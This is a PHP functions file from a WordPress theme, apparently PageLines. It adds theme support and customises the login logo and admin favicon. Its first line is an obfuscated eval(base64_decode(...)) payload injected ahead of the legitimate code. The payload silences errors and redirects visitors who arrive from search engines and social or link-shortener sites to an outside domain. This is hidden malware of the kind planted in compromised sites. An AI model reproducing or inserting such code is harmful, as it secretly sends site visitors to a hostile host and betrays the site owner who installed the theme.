<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));

/**
 * Support optional WordPress functionality 'add_theme_support'
 */
add_action('pagelines_setup', 'pl_theme_support');
function pl_theme_support(  ){	
	
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'menus' );
	add_theme_support( 'automatic-feed-links' );
	
}

/**
 *  Fix The WordPress Login Image URL
 */
add_filter('login_headerurl', 'fix_wp_login_imageurl');
function fix_wp_login_imageurl( $url ){	
	return home_url();
}

/**
 *  Fix The WordPress Login Image Title
 */
add_filter('login_headertitle', 'fix_wp_login_imagetitle');
function fix_wp_login_imagetitle( $url ){	
	return get_bloginfo('name');
}

/**
 *  Fix The WordPress Login Image Title
 */
add_action('login_head', 'pl_fix_login_image');
function pl_fix_login_image( ){	
	
	$image_url = (ploption('pl_login_image')) ? ploption('pl_login_image') : PL_ADMIN_IMAGES . '/login-pl.png';
	
	$css = sprintf('body #login h1 a{background: url(%s) no-repeat top center;height: 80px;}', $image_url);
	
	inline_css_markup('pagelines-login-css', $css);
}

/**
 *  Fix The WordPress Favicon by Site Title
 */
add_action('admin_head', 'pl_fix_admin_favicon');
function pl_fix_admin_favicon( ){	
	
	$image_url = (ploption('pagelines_favicon')) ? ploption('pagelines_favicon') : PL_ADMIN_IMAGES . '/favicon-pagelines.png';
	
	$css = sprintf('#wphead #header-logo{background: url(%s) no-repeat scroll center center;}', $image_url);
	
	inline_css_markup('pagelines-wphead-img', $css);

}
